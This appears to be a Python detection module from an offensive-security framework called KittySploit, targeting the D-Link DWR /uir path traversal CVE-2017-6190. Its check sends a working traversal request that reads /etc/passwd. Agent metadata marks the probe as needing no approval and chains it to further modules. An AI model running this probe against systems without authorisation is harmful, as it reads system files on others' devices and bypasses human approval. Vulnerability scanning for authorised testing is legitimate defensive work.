#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DWR /uir path traversal (CVE-2017-6190)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DWR - /uir Path Traversal Detection (CVE-2017-6190)',
        'description': (
            'Detects CVE-2017-6190 by requesting /uir/../../../../../../etc/passwd '
            '(../ traversal after /uir/, distinct from CVE-2018-10822 // style).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'dlink', 'router', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2018_10822_detect'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-6190',
        ],
        'cve': 'CVE-2017-6190',
    }

    def run(self):
        path = '/uir/' + ('../' * 16) + 'etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='D-Link /uir path traversal (CVE-2017-6190)',
                path='/uir/',
            )
            return True
        return False
